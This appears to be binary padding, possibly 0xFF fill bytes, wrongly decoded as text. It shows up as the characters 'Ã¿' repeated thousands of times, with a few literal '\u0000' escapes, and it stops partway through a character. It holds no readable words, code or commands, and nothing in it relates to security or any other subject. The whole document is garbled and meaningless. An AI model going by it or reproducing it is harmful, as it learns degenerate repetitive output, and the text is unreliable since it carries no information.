Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã